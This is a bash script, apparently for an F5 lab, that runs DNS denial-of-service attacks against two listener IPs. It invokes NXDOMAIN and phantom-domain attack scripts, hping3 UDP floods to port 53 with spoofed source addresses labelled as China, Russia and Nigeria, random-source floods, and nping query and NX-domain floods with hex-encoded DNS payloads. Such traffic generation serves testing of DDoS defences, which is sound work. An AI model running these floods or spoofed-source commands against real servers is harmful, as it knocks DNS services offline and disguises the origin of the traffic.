#!/bin/bash
# Uncomment set command below for code debuging bash
# set -x

home="/home/f5/scripts"

already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
alreadypid=$(ps -ef | grep "$0" | grep bash | grep -v grep | awk '{ print $2 }')
if [  $already -gt 2 ]; then
    echo "The script is already running `expr $already - 2` time."
    kill -9 $alreadypid > /dev/null 2>&1
    exit 1
fi

sitelistener[1]="10.1.10.203"
sitelistener[2]="10.1.10.204"

widip[1]="site36.example.com A"
widip[2]="f5.udf.example.com A"
widip[3]="office.example.com A"
widip[4]="hr.example.com A"
widip[5]="pm.example.com A"
widip[6]="accounting.example.com A"
widip[7]="www.example.com A"
widip[8]="notthere.example.com A"
widip[9]="site40.example.com A"
widip[10]="site42.example.com A"
widip[11]="site38.example.com A"
widip[12]="site36.example.com A"
widip[13]="canonical.example.com CNAME"
widip[14]="mail.example.com MX"

# get length of the array
arraylength=${#sitelistener[@]}
arraylength2=${#widip[@]}

for (( i=1; i<${arraylength}+1; i++ ));
do
    if [ ! -z "${sitelistener[$i]}" ]; then
        # test of listener is responding
        dig @${sitelistener[$i]}
        if [  $? == 0 ]; then
             # Build dns target file and do dig
            for (( j=1; j<${arraylength2}+1; j++ ));
            do
                echo -e "\n# site $i ${sitelistener[$i]} ${widip[$j]} dnstargets.txt"
                echo ${widip[$j]} >> $home/dnstargets.txt
                wip=$(echo ${widip[$j]} | awk '{print $1}')
                dig @${sitelistener[$i]} $wip
                python DoSDNS/attack_dns_nxdomain.py ${sitelistener[$i]} $wip 1000
                python DoSDNS/attack_dns_phantomdomain.py ${sitelistener[$i]} $wip 1000
            done
            echo -e "\n# site $i ${sitelistener[$i]} dnsperf"

            #--- Attacks by Country -----
            echo -e "Attack from China (1.92.0.10), on DNS.. \r\n"
            sudo hping3 --udp -p 53 --faster --spoof 1.92.0.10 ${sitelistener[$i]} > /dev/null 2>&1

            echo -e "Attack from Russia (2.72.0.10), on DNS.. \r\n"
            sudo hping3 --udp -p 53 --faster --spoof 2.72.0.10 ${sitelistener[$i]} > /dev/null 2>&1

            echo -e "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
            sudo hping3 --udp -p 53 --faster --spoof 77.70.128.10 ${sitelistener[$i]} > /dev/null 2>&1

            echo -e "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
            sudo hping3 --rand-source --faster --udp -p 53 ${sitelistener[$i]} > /dev/null 2>&1

            #-----------------------------------------------------------------------------------------------------------------
            RATE=100
            SAMPLES=1000000000
            NPING_SILENT='-HNq'
            VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
            INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"

            echo -e "Performing a DNS query flood \r\n "
            sudo nping ${sitelistener[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY > /dev/null 2>&1

            echo -e "Performing a NX domain flood \r\n "
            sudo nping ${sitelistener[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY > /dev/null 2>&1
            
            r=`shuf -i 60-300 -n 1`;
            perl -le "sleep rand $r" && sudo killall -9 hping3 > /dev/null 2>&1 &
            perl -le "sleep rand $r" && sudo killall -9 nping > /dev/null 2>&1 &

        else
            echo "SKIP ${sitelistener[$i]} - not answering on port 53"
        fi
   fi
done

rm -f $home/dnstargets.txt



